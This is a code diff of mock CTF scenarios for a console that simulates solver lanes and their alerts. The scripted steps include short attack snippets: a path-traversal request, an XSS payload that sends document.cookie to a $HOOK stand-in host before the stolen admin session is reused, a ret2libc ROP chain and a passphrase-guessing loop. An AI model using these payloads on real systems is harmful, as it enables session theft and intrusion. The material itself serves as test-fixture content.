@@ -1,9 +1,11 @@
-"""Mock scenarios for the M0 console. Every name, description, flag and teammate here
-is invented; none comes from a real event.
+"""Mock scenarios for the M0 console. Every name, description, flag, teammate and file
+here is invented; none comes from a real event.
 
 The special challenges each act out one cue from CONSOLE-SPEC.md (ignores the hint,
 effort vs value, wrong direction, loop, stall, budget, teammate solved / box in use,
 flag found). The rest of the board is generic lanes that solve, give up or keep going.
+Course alerts are raised again while a lane keeps repeating itself, so their reasons
+stay current and an ignored answer brings them back.
 """
 
 from __future__ import annotations
@@ -17,6 +19,7 @@ from dataclasses import dataclass, replace
 from .. import fmt
 from ..core.model import (
     ME,
+    ActionKind,
     Alert,
     AlertKind,
     Challenge,
@@ -26,11 +29,11 @@ from ..core.model import (
     PendingKind,
     Suggestion,
 )
-from .script import Script, Step
+from .script import Script, Step, edit, new_file
 
-EVENT = "Demo CTF"
+EVENT = "Mock Range"
 FLAG_FORMAT = r"mock\{[a-z0-9_]+\}"
-TEAMMATES = ("bravo", "delta")  # invented handles
+TEAMMATES = ("wren", "heron")  # invented handles
 
 
 # ---------------------------------------------------------------------- data types
@@ -142,20 +145,71 @@ def static_hiss(flag: str) -> Script:
             ),
         )
 
+    split = new_file("split_channels.py", '''
+import sys
+import wave
+
+import numpy as np
+
+src = wave.open(sys.argv[1])
+frames = np.frombuffer(src.readframes(src.getnframes()), dtype=np.int16)
+for name, data in (("left.wav", frames[0::2]), ("right.wav", frames[1::2])):
+    with wave.open(name, "wb") as out:
+        out.setnchannels(1)
+        out.setsampwidth(2)
+        out.setframerate(src.getframerate())
+        out.writeframes(data.tobytes())
+''')
+    differ = new_file("diff_channels.py", '''
+import argparse
+
+from audio import load
+
+parser = argparse.ArgumentParser()
+parser.add_argument("left")
+parser.add_argument("right")
+parser.add_argument("--invert-phase", action="store_true")
+args = parser.parse_args()
+left, right = load(args.left), load(args.right)
+print(f"max |L-R| = {abs(left - right).max():.4f}")
+''')
+    window = edit("diff_channels.py", '''
+@@ -8,4 +8,12 @@ parser.add_argument("--invert-phase", action="store_true")
++parser.add_argument("--window", type=int)
+ args = parser.parse_args()
+ left, right = load(args.left), load(args.right)
+-print(f"max |L-R| = {abs(left - right).max():.4f}")
++if args.window:
++    for start in range(0, len(left), args.window):
++        chunk = slice(start, start + args.window)
++        peak = abs(left[chunk] - right[chunk]).max()
++        if peak > NOISE_FLOOR:
++            print(f"window {start}: {peak:.4f}")
++else:
++    print(f"max |L-R| = {abs(left - right).max():.4f}")
+''')
+    ocr = new_file("ocr.py", '''
+import sys
+
+from PIL import Image
+import pytesseract
+
+print("text in the picture:", pytesseract.image_to_string(Image.open(sys.argv[1])).strip())
+''')
     main = (
         Step("file static_hiss.wav", "RIFF (little-endian) data, WAVE audio, 16 bit, stereo 44100 Hz"),
         Step("sox static_hiss.wav -n stat", "Length 36.2 s · RMS amplitude 0.21 · Rough frequency 1764"),
-        Step("python3 split_channels.py static_hiss.wav", "wrote left.wav and right.wav", artifacts=("left.wav", "right.wav")),
-        Step("python3 diff_channels.py left.wav right.wav", "max |L-R| = 0.0004 over 1.6M samples"),
+        Step("python3 split_channels.py static_hiss.wav", "wrote left.wav and right.wav", artifacts=("left.wav", "right.wav"), files=(split,)),
+        Step("python3 diff_channels.py left.wav right.wav", "max |L-R| = 0.0004 over 1.6M samples", files=(differ,)),
         Step("python3 lsb_extract.py left.wav --bits 1", "no printable run longer than 4 bytes"),
         Step("python3 diff_channels.py --invert-phase left.wav right.wav", "the residual has no structure above the noise floor", alert=ignores_hint),
         Step("python3 lsb_extract.py right.wav --bits 2", "no printable run longer than 4 bytes"),
         Step("python3 xor_channels.py left.wav right.wav", "output entropy 7.99 bits/byte"),
-        Step("python3 diff_channels.py --window 512 left.wav right.wav", "no window rises above the noise floor"),
+        Step("python3 diff_channels.py --window 512 left.wav right.wav", "no window rises above the noise floor", files=(window,), alert=ignores_hint),
     )
     sstv = (
         Step("python3 -m sstv -d static_hiss.wav -o decoded.png", "[+] mode Robot 36 · 240 lines · wrote decoded.png", artifacts=("decoded.png",)),
-        Step("python3 ocr.py decoded.png", f"text in the picture: {flag}", flag=flag),
+        Step("python3 ocr.py decoded.png", f"text in the picture: {flag}", flag=flag, files=(ocr,)),
     )
     sstv_plan = "Decode the audio as slow-scan TV and read the picture"
     return Script(
@@ -184,6 +238,39 @@ OVERTHINK = (
     ("python3 vigenere_crack.py --keyed-alphabet --max-key 30", "best key length 11, score 0.39 (noise)"),
 )
 
+OVERTHINK_FILES = {
+    3: new_file("vigenere_crack.py", '''
+import sys
+
+from scoring import english_score
+
+text = open("second_guess.txt").read()
+best = max(
+    (english_score(decrypt(text, key)), key)
+    for length in range(1, int(sys.argv[-1]) + 1)
+    for key in candidate_keys(text, length)
+)
+print("best key length", len(best[1]), "score", round(best[0], 2))
+'''),
+    6: new_file("z3_alphabet.py", '''
+from z3 import Distinct, Int, Solver
+
+alphabet = [Int(f"p{i}") for i in range(26)]
+solver = Solver()
+solver.add(Distinct(alphabet))
+solver.add(*[0 <= p for p in alphabet], *[p < 26 for p in alphabet])
+solver.add(crib_constraints(alphabet, "mock{"))
+print(solver.check())
+'''),
+    11: new_file("notes.md", '''
+# second_guess
+
+- IC 0.066 says one alphabet, but no shift scored well (did I try them all?)
+- Vigenere, affine, Hill, Playfair, Enigma, transposition: all noise
+- Next: a keyed alphabet with a layered polyalphabetic stage
+'''),
+}
+
 
 def second_guess(flag: str) -> Script:
     """Overthinking: a 50-pointer with hundreds of solves gets a cryptanalysis marathon."""
@@ -200,10 +287,23 @@ def second_guess(flag: str) -> Script:
             ),
         )
 
-    steps = [Step(*OVERTHINK[i % len(OVERTHINK)]) for i in range(39)]
-    steps.append(Step(*OVERTHINK[39 % len(OVERTHINK)], alert=effort))
-    steps += [Step(*OVERTHINK[i % len(OVERTHINK)]) for i in range(40, 40 + len(OVERTHINK))]
-    caesar = Step("python3 caesar_all.py second_guess.txt", f"shift 11: {flag}", flag=flag)
+    def overthink(i: int, **kw) -> Step:
+        files = (OVERTHINK_FILES[i],) if i in OVERTHINK_FILES else ()
+        return Step(*OVERTHINK[i % len(OVERTHINK)], files=files, **kw)
+
+    steps = [overthink(i) for i in range(39)]
+    steps.append(overthink(39, alert=effort))
+    loop = [overthink(i) for i in range(40, 40 + len(OVERTHINK))]
+    loop[-1] = replace(loop[-1], alert=effort)  # still at it: the alert comes back, with new numbers
+    steps += loop
+    caesar_py = new_file("caesar_all.py", '''
+import sys
+
+text = open(sys.argv[1]).read()
+for shift in range(26):
+    print(shift, "".join(rotate(c, shift) for c in text))
+''')
+    caesar = Step("python3 caesar_all.py second_guess.txt", f"shift 11: {flag}", flag=flag, files=(caesar_py,))
     return Script(
         plan="Work out which polyalphabetic cipher this is and break it",
         steps=tuple(steps),
@@ -225,7 +325,7 @@ def paper_trail(flag: str) -> Script:
     """Web wrong way: brute-forcing directories while the source is in the handout."""
 
     def wrong_way(lane: Lane, ch: Challenge) -> Alert:
-        scans = sum(1 for a in lane.actions if a.text.startswith(SCANNERS))
+        scans = sum(1 for a in lane.actions if a.kind is ActionKind.STEP and a.text.startswith(SCANNERS))
         return Alert(
             AlertKind.DIRECTION,
             f"{scans} brute-force scans of the instance found no new paths, while the full source "
@@ -240,20 +340,36 @@ def paper_trail(flag: str) -> Script:
             ),
         )
 
+    fuzz = new_file("fuzz.sh", '''
+#!/bin/sh
+for list in raft-medium-directories raft-large-files big; do
+  ffuf -w "$list.txt" -u "$TARGET/FUZZ" -mc 200,301,302,403 -o "out/$list.json"
+done
+''')
+    exploit = new_file("exploit.py", '''
+import sys
+
+import requests
+
+target = sys.argv[1]
+# export.py joins EXPORT_DIR with ?name= unnormalised: walk out of it
+resp = requests.get(f"{target}/export", params={"name": "../../flag.txt"}, timeout=10)
+print(resp.text.strip())
+''')
     main = (
         Step("curl -si $TARGET/ | head -5", "HTTP/1.1 200 OK · Server: gunicorn"),
-        Step("ffuf -w raft-medium-directories.txt -u $TARGET/FUZZ", "30 000 requests · 3 paths: /login /static /tickets"),
+        Step("ffuf -w raft-medium-directories.txt -u $TARGET/FUZZ", "30 000 requests · 3 paths: /login /static /tickets", files=(fuzz,)),
         Step("ffuf -w raft-large-files.txt -u $TARGET/FUZZ", "37 000 requests · no new paths"),
         Step("gobuster dir -u $TARGET -w big.txt -x php,bak,old", "20 469 requests · no new paths"),
         Step("ffuf -w burp-parameter-names.txt -u '$TARGET/tickets?FUZZ=1'", "6 453 requests · no new parameters", alert=wrong_way),
         Step("feroxbuster -u $TARGET -w directory-list-big.txt --depth 3", "220 000 requests · 429 Too Many Requests x41"),
         Step("ffuf -w raft-large-words.txt -u $TARGET/tickets/FUZZ", "119 600 requests · no new paths"),
-        Step("dirsearch -u $TARGET -e py,zip,bak", "11 714 requests · no new paths"),
+        Step("dirsearch -u $TARGET -e py,zip,bak", "11 714 requests · no new paths", alert=wrong_way),
     )
     source = (
         Step("unzip -o paper_trail_src.zip -d src", "app.py · export.py · templates/ (14 files)", artifacts=("src/",)),
         Step("grep -n 'send_file\\|route' src/export.py", "41: path = os.path.join(EXPORT_DIR, request.args['name'])  # not normalised"),
-        Step("curl -s \"$TARGET/export?name=../../flag.txt\"", flag, flag=flag),
+        Step("python3 exploit.py $TARGET", flag, flag=flag, files=(exploit,)),
     )
     source_first = Script(plan="Source first: read paper_trail_src.zip before touching the instance", steps=source)
     return Script(
@@ -269,11 +385,22 @@ def paper_trail(flag: str) -> Script:
 
 def ticket_desk(flag: str) -> Script:
     """Flag found: a clean solve that waits for the player to approve the submit."""
+    payload_py = new_file("make_payload.py", '''
+import sys
+
+hook = sys.argv[sys.argv.index("--exfil") + 1]
+print(f"<img src=x onerror=fetch('{hook}/?c='+document.cookie)>")
+''')
     steps = (
         Step("unzip -l ticket_desk.zip", "app.py · bot.js · templates/ticket.html"),
         Step("grep -rn 'safe\\|innerHTML' ticket_desk/", "templates/ticket.html:22: {{ body|safe }}"),
         Step("sed -n 1,40p ticket_desk/bot.js", "the bot logs in as admin, opens /ticket/<id>, waits 3 s"),
-        Step("python3 make_payload.py --exfil $HOOK > payload.txt", "<img src=x onerror=fetch('$HOOK/?c='+document.cookie)>", artifacts=("payload.txt",)),
+        Step(
+            "python3 make_payload.py --exfil $HOOK > payload.txt",
+            "<img src=x onerror=fetch('$HOOK/?c='+document.cookie)>",
+            artifacts=("payload.txt",),
+            files=(payload_py, new_file("payload.txt", "<img src=x onerror=fetch('$HOOK/?c='+document.cookie)>")),
+        ),
         Step("curl -s -X POST $TARGET/ticket --data-binary @payload.txt", "[+] ticket #4471 created"),
         Step("curl -s $HOOK/log | tail -1", "GET /?c=session=<admin session, 64 chars>", artifacts=("admin session",)),
         Step("curl -s -b session=$ADMIN $TARGET/admin/flag", flag, flag=flag),
@@ -283,16 +410,48 @@ def ticket_desk(flag: str) -> Script:
 
 def night_shift(flag: str) -> Script:
     """Team: a teammate solves this while the lane is still on it."""
+    extract = new_file("extract_table.py", '''
+import sys
+
+binary, offset, size = sys.argv[1], int(sys.argv[2], 16), int(sys.argv[3])
+data = open(binary, "rb").read()
+open("table.bin", "wb").write(data[offset - 0x1000 : offset - 0x1000 + size])
+print(f"wrote table.bin ({size} bytes)")
+''')
+    rolling = new_file("solve_rolling.py", '''
+import sys
+
+table = open(sys.argv[1], "rb").read()
+out, key = [], 0x42
+for byte in table:
+    plain = byte ^ key
+    out.append(plain)
+    key = ((plain << 3) | (plain >> 5)) & 0xFF
+print(bytes(out))
+''')
+    rotate = edit("solve_rolling.py", '''
+@@ -4,7 +4,9 @@ table = open(sys.argv[1], "rb").read()
+ out, key = [], 0x42
+-for byte in table:
++rot = int(sys.argv[sys.argv.index("--rotate") + 1]) if "--rotate" in sys.argv else 3
++for i, byte in enumerate(table):
+     plain = byte ^ key
+     out.append(plain)
+-    key = ((plain << 3) | (plain >> 5)) & 0xFF
++    shift = 3 if i < 16 else rot
++    key = ((plain << shift) | (plain >> (8 - shift))) & 0xFF
+ print(bytes(out))
+''')
     steps = (
         Step("file night_shift", "ELF 64-bit LSB pie executable, x86-64, stripped"),
         Step("strings -n 8 night_shift | head", "Enter badge code: · Clocked out. Good night. · Wrong badge."),
         Step("r2 -qc 'aaa; afl~check' night_shift", "0x1290  check_badge (412 bytes)"),
         Step("r2 -qc 'pdf @ 0x1290' night_shift | head -60", "xor loop over 24 bytes against a table at 0x4020"),
-        Step("python3 extract_table.py night_shift 0x4020 24", "wrote table.bin (24 bytes)", artifacts=("table.bin",)),
+        Step("python3 extract_table.py night_shift 0x4020 24", "wrote table.bin (24 bytes)", artifacts=("table.bin",), files=(extract,)),
         Step("python3 invert_xor.py table.bin", "bytes 0-8 decode; 9-23 depend on a rolling key"),
         Step("r2 -qc 'pdf @ 0x1340' night_shift", "rolling key = previous byte rotated left by 3"),
-        Step("python3 solve_rolling.py table.bin", "bytes 9-15 recovered; 16-23 still off by one"),
-        Step("python3 solve_rolling.py table.bin --rotate 5", "checking the rotation amount for bytes 16-23"),
+        Step("python3 solve_rolling.py table.bin", "bytes 9-15 recovered; 16-23 still off by one", files=(rolling,)),
+        Step("python3 solve_rolling.py table.bin --rotate 5", "checking the rotation amount for bytes 16-23", files=(rotate,)),
         Step("r2 -qc 'pdf @ 0x13a0' night_shift", "a second key schedule starts at byte 16"),
     )
     return Script(plan="Recover the badge-code check from night_shift", steps=paced(steps, 2), repeat_from=7)
@@ -300,29 +459,59 @@ def night_shift(flag: str) -> Script:
 
 def harbor_master(flag: str) -> Script:
     """Team: a teammate holds the live box; then the lane asks to use it (approval)."""
+    holder = TEAMMATES[1]
 
     def box_in_use(lane: Lane, ch: Challenge) -> Alert:
         return Alert(
             AlertKind.TEAMMATE,
-            f"delta holds the live instance of {ch.name}. The lane is kept off the box and works "
-            "on the handout locally until delta releases it.",
+            f"{holder} holds the live instance of {ch.name}. The lane is kept off the box and works "
+            f"on the handout locally until {holder} releases it.",
             (Suggestion("", "Nothing to do: the lane stays off the box by itself"),),
         )
 
+    offset = new_file("find_offset.py", '''
+from pwn import cyclic, cyclic_find, process
+
+io = process("./harbor_master")  # the local copy from the handout, in the sandbox
+io.sendline(cyclic(200))
+io.wait()
+print("saved RIP at offset", cyclic_find(io.corefile.read(io.corefile.rsp, 4)))
+''')
+    exploit = new_file("exploit.py", '''
+import sys
+
+from pwn import ELF, ROP, p64, remote
+
+elf = ELF("./harbor_master")
+rop = ROP(elf)
+rop.call("puts", [elf.got["puts"]])
+rop.call(elf.symbols["main"])
+payload = b"A" * 72 + rop.chain()
+print(f"payload is {len(payload)} bytes")
+''')
+    align = edit("exploit.py", '''
+@@ -5,6 +5,7 @@ from pwn import ELF, ROP, p64, remote
+ elf = ELF("./harbor_master")
+ rop = ROP(elf)
++rop.raw(rop.find_gadget(["ret"]))  # 16-byte stack alignment before puts
+ rop.call("puts", [elf.got["puts"]])
+ rop.call(elf.symbols["main"])
+ payload = b"A" * 72 + rop.chain()
+''')
     offline = "Build the exploit against the handout locally until the box is free"
     steps = (
         Step("checksec --file=harbor_master", "Partial RELRO · No canary · NX enabled · No PIE"),
         Step("r2 -qc 'pdf @ sym.add_ship' harbor_master", "fgets(buf, 0x100, stdin) into a 0x40-byte stack buffer"),
-        Step("request the live instance", "held by delta (team)", alert=box_in_use, plan=offline, team_only=True),
-        Step("python3 find_offset.py harbor_master", "saved RIP at offset 72"),
+        Step("request the live instance", f"held by {holder} (team)", alert=box_in_use, plan=offline, team_only=True),
+        Step("python3 find_offset.py harbor_master", "saved RIP at offset 72", files=(offset,)),
         Step("ROPgadget --binary harbor_master | grep 'pop rdi'", "0x401273 : pop rdi ; ret"),
-        Step("python3 exploit.py --print-chain", "ret2plt leak of puts, then ret2libc: 6 gadgets"),
+        Step("python3 exploit.py --print-chain", "ret2plt leak of puts, then ret2libc: 6 gadgets", files=(exploit,)),
         Step("python3 exploit.py LOCAL --dry-run", "payload is 152 bytes; no bad bytes"),
-        Step("python3 exploit.py --print-chain --align", "added a ret for stack alignment"),
+        Step("python3 exploit.py --print-chain --align", "added a ret for stack alignment", files=(align,)),
         Step("python3 libc_offsets.py libc.so.6", "offsets for puts, system and /bin/sh loaded"),
         Step("python3 exploit.py LOCAL --dry-run --stage 2", "stage 2 is 64 bytes"),
         Step("python3 exploit.py --lint", "no problems found"),
-        Step("check the live instance", "delta released the box", clear=(AlertKind.TEAMMATE,), team_only=True),
+        Step("check the live instance", f"{holder} released the box", clear=(AlertKind.TEAMMATE,), team_only=True),
         Step(
             "request live-instance access",
             "instance access needs your approval",
@@ -336,13 +525,13 @@ def harbor_master(flag: str) -> Script:
     return Script(plan="Find the overflow in the ship log and build a ROP chain", steps=paced(steps, 4), on_box=on_box, base_tokens=5_000)
 
 
-def gearbox(flag: str) -> Script:
+def ratchet_run(flag: str) -> Script:
     """Loop: the same command, again and again."""
-    cmd = "python3 angr_solve.py gearbox"
+    cmd = "python3 angr_solve.py ratchet_run"
 
     def looping(lane: Lane, ch: Challenge) -> Alert:
         repeats = 0
-        for action in reversed(lane.actions):
+        for action in reversed([a for a in lane.actions if a.kind is ActionKind.STEP]):
             if action.text != cmd:
                 break
             repeats += 1
@@ -355,25 +544,44 @@ def gearbox(flag: str) -> Script:
             ),
         )
 
+    angr_py = new_file("angr_solve.py", '''
+import angr
+
+project = angr.Project("ratchet_run", auto_load_libs=False)
+state = project.factory.entry_state(stdin=angr.SimFileStream(name="stdin", size=32))
+simgr = project.factory.simulation_manager(state)
+simgr.explore(find=lambda s: b"lined up" in s.posix.dumps(1), timeout=300)
+print(simgr.found[0].posix.dumps(0) if simgr.found else "timeout")
+''')
+    lift_py = new_file("lift_rounds.py", '''
+import sys
+
+from rounds_spec import ROUNDS  # 32 rotate-and-xor rounds read off the disassembly
+
+print("from z3 import BitVec, Solver")
+print("x = [BitVec(f'x{i}', 8) for i in range(32)]")
+for i, (rot, key) in enumerate(ROUNDS):
+    print(f"x = step(x, {rot}, {key:#04x})  # round {i}")
+''')
     timeout = "timeout after 300 s (path explosion)"
     lift = (
-        Step("python3 lift_rounds.py gearbox > rounds.py", "lifted 32 rounds into z3 constraints", artifacts=("rounds.py",)),
+        Step("python3 lift_rounds.py ratchet_run > rounds.py", "lifted 32 rounds into z3 constraints", artifacts=("rounds.py",), files=(lift_py,)),
         Step("python3 rounds.py", f"sat: {flag}", flag=flag),
     )
     return Script(
         plan="Let angr find the input that passes all 32 rounds",
         steps=(
-            Step("file gearbox", "ELF 64-bit LSB executable, statically linked, stripped"),
-            Step("r2 -qc 'aaa; pdf @ main' gearbox | head -60", "reads 32 bytes; 32 rounds of rotate and xor; compares with a table"),
-            Step(cmd, timeout),
+            Step("file ratchet_run", "ELF 64-bit LSB executable, statically linked, stripped"),
+            Step("r2 -qc 'aaa; pdf @ main' ratchet_run | head -60", "reads 32 bytes; 32 rounds of rotate and xor; compares with a table"),
+            Step(cmd, timeout, files=(angr_py,)),
             Step(cmd, timeout),
             Step(cmd, timeout),
             Step(cmd, timeout, alert=looping),
-            Step(cmd, timeout),
+            Step(cmd, timeout, alert=looping),
         ),
         repeat_from=6,
         on_hint=lift,
-        fresh=Script(plan="Lift the rounds into z3 by hand", steps=(Step("file gearbox", "statically linked, stripped"), *lift)),
+        fresh=Script(plan="Lift the rounds into z3 by hand", steps=(Step("file ratchet_run", "statically linked, stripped"), *lift)),
     )
 
 
@@ -391,6 +599,34 @@ def quiet_ledger(flag: str) -> Script:
             ),
         )
 
+    parse_py = new_file("parse_sigs.py", '''
+import csv
+import json
+import sys
+
+rows = json.load(open(sys.argv[1]))
+writer = csv.writer(sys.stdout)
+writer.writerow(["msg_hash", "r", "s"])
+for entry in rows:
+    writer.writerow([entry["hash"], entry["sig"]["r"], entry["sig"]["s"]])
+''')
+    lattice_py = new_file("lattice_attack.py", '''
+import sys
+
+from sigs import load_sigs
+from hnp import build_lattice, short_vectors
+
+known = int(sys.argv[sys.argv.index("--known-bits") + 1])
+lattice = build_lattice(load_sigs("sigs.csv"), known_bits=known)
+print(next(short_vectors(lattice), "no short vector found"))
+''')
+    bias_py = new_file("bias_scan.py", '''
+from sigs import load_sigs
+
+nonces = recover_nonce_bounds(load_sigs("sigs.csv"))
+top = min(n.bit_length() for n in nonces)
+print(f"the top {256 - top} bits of every nonce are zero")
+''')
     vague = (
         ("re-reads verify.py", "no new observations"),
         ("python3 lattice_attack.py --known-bits 4", "no short vector found"),
@@ -401,15 +637,17 @@ def quiet_ledger(flag: str) -> Script:
     )
     steps = [
         Step("python3 -c 'import json; print(len(json.load(open(\"ledger.json\"))))'", "512 signed entries"),
-        Step("python3 parse_sigs.py ledger.json > sigs.csv", "wrote sigs.csv (512 rows)", artifacts=("sigs.csv",)),
+        Step("python3 parse_sigs.py ledger.json > sigs.csv", "wrote sigs.csv (512 rows)", artifacts=("sigs.csv",), files=(parse_py,)),
         Step("python3 check_nonces.py ledger.json", "all 512 r values distinct"),
         Step("python3 curve_params.py verify.py", "secp256k1; nonce from a custom PRNG", artifacts=("curve params",)),
     ]
-    steps += [Step(*vague[i % len(vague)]) for i in range(11)]
+    steps += [Step(*vague[i % len(vague)], files=(lattice_py,) if i == 1 else ()) for i in range(11)]
     steps.append(Step(*vague[11 % len(vague)], alert=stalled))
-    steps += [Step(*v) for v in vague]
+    loop = [Step(*v) for v in vague]
+    loop[-1] = replace(loop[-1], alert=stalled)
+    steps += loop
     biased = (
-        Step("python3 bias_scan.py sigs.csv", "the top 6 bits of every nonce are zero", artifacts=("nonce bias",)),
+        Step("python3 bias_scan.py sigs.csv", "the top 6 bits of every nonce are zero", artifacts=("nonce bias",), files=(bias_py,)),
         Step("python3 hnp_lattice.py sigs.csv --known-bits 6", "[+] recovered the signing key", artifacts=("private key",)),
         Step("python3 sign.py --forge 'transfer: flag'", flag, flag=flag),
     )
@@ -424,6 +662,25 @@ def quiet_ledger(flag: str) -> Script:
 
 def deep_archive(flag: str) -> Script:
     """Budget: heavy outputs push the lane to its cap; it waits for more."""
+    carve_py = new_file("carve_range.py", '''
+import sys
+
+image, start, end = sys.argv[1], parse_size(sys.argv[2]), parse_size(sys.argv[3])
+with open(image, "rb") as src, open("blob.bin", "wb") as out:
+    src.seek(start)
+    out.write(src.read(end - start))
+print(f"wrote blob.bin ({(end - start) >> 20} MiB)")
+''')
+    luks_py = new_file("luks_try.py", '''
+import subprocess
+import sys
+
+blob, candidates = sys.argv[1], open(sys.argv[2]).read().split()
+for i, word in enumerate(candidates, 1):
+    if subprocess.run(["cryptsetup", "open", "--test-passphrase", blob], input=word.encode()).returncode == 0:
+        print(f"[+] unlocked with candidate {i}")
+        break
+''')
     steps = (
         Step("zstd -d archive.img.zst", "archive.img: 12.0 GiB"),
         Step("mmls archive.img", "GPT · 3 partitions (EFI, root, data)"),
@@ -434,12 +691,12 @@ def deep_archive(flag: str) -> Script:
         Step("photorec /d carve /cmd archive.img search", "carved 9 412 files", artifacts=("carve/",)),
         Step("grep -rla 'mock{' carve/ | head", "no matches"),
         Step("python3 entropy_map.py archive.img", "high-entropy run from 7.1 to 7.4 GiB"),
-        Step("python3 carve_range.py archive.img 7.1G 7.4G", "wrote blob.bin (300 MiB)", artifacts=("blob.bin",)),
+        Step("python3 carve_range.py archive.img 7.1G 7.4G", "wrote blob.bin (300 MiB)", artifacts=("blob.bin",), files=(carve_py,)),
         Step("binwalk blob.bin", "LUKS header at offset 0"),
         Step("python3 luks_dump.py blob.bin", "LUKS2 · pbkdf2 · 1 key slot"),
         Step("grep -ri 'cryptsetup' out/home/*/.bash_history", "ops typed the passphrase on the next line"),
         Step("python3 history_context.py out/home/ops/.bash_history", "passphrase candidates: 4", artifacts=("passphrase candidates",)),
-        Step("python3 luks_try.py blob.bin candidates.txt", "[+] unlocked with candidate 3"),
+        Step("python3 luks_try.py blob.bin candidates.txt", "[+] unlocked with candidate 3", files=(luks_py,)),
         Step("find /mnt/blob -name '*.txt' | head", "/mnt/blob/notes.txt"),
         Step("cat /mnt/blob/notes.txt", flag, flag=flag),
     )
@@ -531,6 +788,16 @@ GENERIC_STEPS = {
     ),
 }
 
+GENERIC_SOLVE = {
+    "web": 'import requests\n\nsession = forge_admin_session(read_secret("config.py"))\nprint(requests.get(TARGET + "/admin/flag", cookies={"session": session}).text)\n',
+    "for": 'from carve import extract_all\n\nfor item in extract_all("evidence.bin"):\n    if item.name.endswith(".txt"):\n        print(item.read().decode())\n',
+    "rev": 'from z3 import BitVec, Solver\n\nkey = [BitVec(f"k{i}", 8) for i in range(32)]\nsolver = Solver()\nsolver.add(*recovered_checks(key))\nprint(model_to_bytes(solver))\n',
+    "pwn": 'from pwn import remote\n\nio = remote(HOST, PORT)\nio.sendline(build_payload(leak_canary(io)))\nio.sendline(b"cat flag.txt")\nprint(io.recvline().decode())\n',
+    "cry": 'from Crypto.Util.number import long_to_bytes\n\np, q = fermat_factor(N)\nd = pow(E, -1, (p - 1) * (q - 1))\nprint(long_to_bytes(pow(C, d, N)).decode())\n',
+    "misc": 'from service import Session\n\nwith Session(HOST, PORT) as session:\n    for question in session.questions():\n        session.answer(solve(question))\n    print(session.final_message())\n',
+    "osint": 'clues = ["harbour crane", "red tram", "Rope & Anchor"]\nstreet = narrow_down(clues)\nprint(f"mock{{{slug(street)}}}")\n',
+}
+
 
 def generic(spec: Spec, flag: str, seed: int) -> Script:
     """A plausible lane for the category: it solves, gives up, or keeps going."""
@@ -540,10 +807,13 @@ def generic(spec: Spec, flag: str, seed: int) -> Script:
     every = rng.choice((1, 2, 2, 3))
     start = rng.randrange(len(pool))
     steps = [Step(*pool[(start + i) % len(pool)], every=every) for i in range(length)]
+    notes = new_file("notes.md", f"# {spec.name}\n\n- plan: {GENERIC_PLANS[spec.category]}\n- first look: {pool[start][1]}\n")
+    steps[1] = replace(steps[1], files=(notes,))
     roll = rng.random()
     repeat_from = None
     if roll < 0.6:
-        steps.append(Step("python3 solve.py", f"candidate: {flag}", flag=flag, every=every))
+        solve_py = new_file("solve.py", GENERIC_SOLVE[spec.category])
+        steps.append(Step("python3 solve.py", f"candidate: {flag}", flag=flag, every=every, files=(solve_py,)))
     elif roll < 0.8:
         steps.append(Step("writes up what it tried", "no promising lead left", gave_up=f"no lead after {length + 1} turns", every=every))
     else:
@@ -583,7 +853,7 @@ WAVE_GENERIC = (
     _g("pocket-litter", "for", "Pocket Litter", 100, "Everything in a suspect's pockets, photographed. Start with the receipt.", ("pocket.jpg",)),
     _g("timecard", "for", "Timecard", 250, "Who clocked in at 03:12? The access log has gaps.", ("access.evtx",), model="sonnet"),
     _g("faded-polaroid", "for", "Faded Polaroid", 150, "An instant photo left in the sun. Something is still in there.", ("polaroid.png",)),
-    _g("clockwork-key", "rev", "Clockwork Key", 200, "Wind it up and it checks your key, one tooth at a time.", ("clockwork",)),
+    _g("tumbler-lock", "rev", "Tumbler Lock", 200, "Turn the pins one at a time; the lock tells you when one sets.", ("tumbler_lock",)),
     _g("tin-soldier", "rev", "Tin Soldier", 100, "A toy program that marches through your input.", ("tin_soldier",)),
     _g("folded-map", "rev", "Folded Map", 250, "The map only makes sense when it is folded the right way.", ("folded_map.apk",), model="sonnet"),
     _g("lighthouse-vm", "rev", "Lighthouse VM", 400, "A tiny virtual machine keeps the light on. Its bytecode keeps a secret.", ("lighthouse_vm", "program.bin"), model="sonnet"),
@@ -600,20 +870,20 @@ WAVE_GENERIC = (
     _g("square-dance", "cry", "Square Dance", 200, "Partners swap, squares shuffle. The key is in the choreography.", ("square_dance.py",)),
     _g("paper-moon", "cry", "Paper Moon", 250, "A home-made stream cipher seeded from the phase of the moon.", ("moon.py", "out.txt")),
     _g("rusty-knapsack", "cry", "Rusty Knapsack", 300, "A knapsack cryptosystem, freshly dusted off.", ("knapsack.txt",), model="sonnet"),
-    _g("slow-drip", "cry", "Slow Drip", 200, "The padding oracle answers. Eventually.", (), True),
+    _g("leaky-tap", "cry", "Leaky Tap", 200, "The padding oracle answers. Eventually.", (), True),
     _g("sandbox-sorter", "misc", "Sandbox Sorter", 150, "A Python jail that only lets you sort things.", (), True),
     _g("jukebox", "misc", "Jukebox", 100, "Pick a song. The jukebox plays notes, and notes are just numbers.", ("jukebox.mid",)),
     _g("polyglot-pizza", "misc", "Polyglot Pizza", 200, "One file, many crusts: a valid PDF, a valid ZIP and something else.", ("pizza.pdf",)),
     _g("lost-socks", "misc", "Lost Socks", 100, "Pair up the socks. The odd one out holds the flag.", ("socks.txt",)),
     _g("treasure-hunt", "misc", "Treasure Hunt", 250, "Seven clues, seven services, one flag.", (), True),
-    _g("postcard", "osint", "Postcard", 100, "Greetings from somewhere. Where was this photo taken?", ("postcard.jpg",)),
+    _g("holiday-snap", "osint", "Holiday Snap", 100, "Greetings from somewhere. Where was this photo taken?", ("holiday_snap.jpg",)),
     _g("rooftop-view", "osint", "Rooftop View", 150, "Find the building this photo was taken from. The flag is the street name.", ("rooftop.jpg",)),
     _g("ferry-schedule", "osint", "Ferry Schedule", 200, "Which ferry did our suspect take? The timetable changed last year.", ("schedule.pdf",)),
     _g("mountain-pass", "osint", "Mountain Pass", 150, "The trail camera caught a hiker. Name the pass.", ("trailcam.jpg",)),
     _g("old-forum", "osint", "Old Forum", 250, "Our target posted on a forum that no longer exists."),
 )
 
-GEARBOX = Spec("gearbox", "rev", "Gearbox", 200, "Every gear turns the next. Find the input that makes them all line up.", ("gearbox",), script=gearbox)
+RATCHET_RUN = Spec("ratchet-run", "rev", "Ratchet Run", 200, "Every click turns the next gear. Find the input that lines them all up.", ("ratchet_run",), script=ratchet_run)
 QUIET_LEDGER = Spec("quiet-ledger", "cry", "Quiet Ledger", 300, "The bank's ledger signs every entry. Some signatures look a little too alike.", ("ledger.json", "verify.py"), script=quiet_ledger)
